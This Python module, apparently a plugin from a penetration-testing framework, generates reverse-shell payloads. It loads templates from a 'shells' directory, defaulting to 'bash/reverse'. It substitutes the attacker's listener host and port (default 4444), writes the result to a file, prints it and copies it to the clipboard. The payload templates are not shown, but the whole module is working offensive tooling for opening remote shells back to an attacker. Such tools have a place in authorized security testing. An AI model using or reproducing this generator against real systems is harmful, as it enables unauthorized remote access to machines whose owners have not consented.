from pathlib import Path
import subprocess

from core.attacker import resolve_lhost

# --- CLEAN UI PALETTE ---
G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
W_BOLD, DIM = '\033[1m', '\033[2m'

BASE_DIR = Path(__file__).resolve().parent.parent.parent
SHELL_DIR = BASE_DIR / "shells"

# =========================================================
# HELPERS
# =========================================================

def detect_mode(path):
    ext = path.suffix.lower()
    if ext in [".php", ".ps1", ".exe", ".dll", ".bat"]:
        return "file"
    return "inline"

def discover_shells():
    shells = {}
    if not SHELL_DIR.exists():
        return shells

    for path in SHELL_DIR.rglob("*"):
        if not path.is_file():
            continue
        rel = path.relative_to(SHELL_DIR)
        shell_name = str(rel.with_suffix(""))
        shells[shell_name] = {
            "path": path,
            "mode": detect_mode(path),
        }
    return shells

def copy_to_clipboard(text):
    for utility in [["xclip", "-selection", "clipboard"], ["xsel", "-bi"]]:
        try:
            p = subprocess.Popen(utility, stdin=subprocess.PIPE, close_fds=True)
            p.communicate(input=text.encode("utf-8"))
            return True
        except FileNotFoundError:
            continue
    try:
        p = subprocess.Popen(["pbcopy"], stdin=subprocess.PIPE, close_fds=True)
        p.communicate(input=text.encode("utf-8"))
        return True
    except Exception:
        return False

# =========================================================
# MAIN
# =========================================================

def run(data, cred, args):
    shells = discover_shells()

    # Determine shell type
    stype = (
        args.extra[0]
        if (hasattr(args, "extra") and args.extra)
        else "bash/reverse"
    )

    if stype not in shells:
        print(f"\n{R}[!] Error: Unknown shell template type '{stype}'{W}")
        print(f"\n{W_BOLD}[*] Available Templates:{W}")
        for name in sorted(shells):
            print(f"  {B}├──{W} {name}")
        print()
        return

    shell_info = shells[stype]

    # Target & Host Parameters
    lhost = resolve_lhost(args)
    if not lhost:
        print(f"\n{R}[!] Error: LHOST resolution failed.{W}\n")
        return

    lport_raw = getattr(args, "lport", None)
    lport = int(lport_raw) if lport_raw is not None else 4444

    shell_path = shell_info["path"]
    if not shell_path.exists():
        print(f"\n{R}[!] Error: Template file missing: {shell_path}{W}\n")
        return

    # Parse and populate templates
    payload = (
        shell_path.read_text()
        .replace("{lhost}", lhost)
        .replace("{lport}", str(lport))
    )

    # Setup out-file attributes
    ext = shell_path.suffix if shell_path.suffix else ".txt"
    outfile = Path.cwd() / f"{stype.replace('/', '_')}_{lport}{ext}"
    outfile.write_text(payload)

    raw_mode = (getattr(args, "format", None) == "raw")

    if not raw_mode:
        print(f"\n{W_BOLD}[*] SHELL GENERATION SUMMARY{W}")
        print(f"  {B}├──{W} Template:   {C}{stype}{W}")
        print(f"  {B}├──{W} Listener:   {G}{lhost}{W}:{Y}{lport}{W}")
        print(f"  {B}├──{W} Execution:  {Y}{shell_info['mode']}{W}")
        print(f"  {B}└──{W} Artifact:   {G}{outfile}{W}")

        # Handle inline printing and clipboard operations
        if shell_info["mode"] == "inline":
            print(f"\n{W_BOLD}[*] Generated Payload String:{W}")
            print(f"\n      {Y}{payload.strip()}{W}\n")
            
            if copy_to_clipboard(payload):
                print(f"  {G}[+] Payload copied directly to system clipboard.{W}\n")
        else:
            print(f"\n{W_BOLD}[*] Script file compiled and ready.{W}\n")
    else:
        # Strict fallback payload output for raw formats
        print(payload)

    return [
        {
            "type": "shell",
            "data": {
                "payload": payload,
                "file": str(outfile),
            }
        }
    ]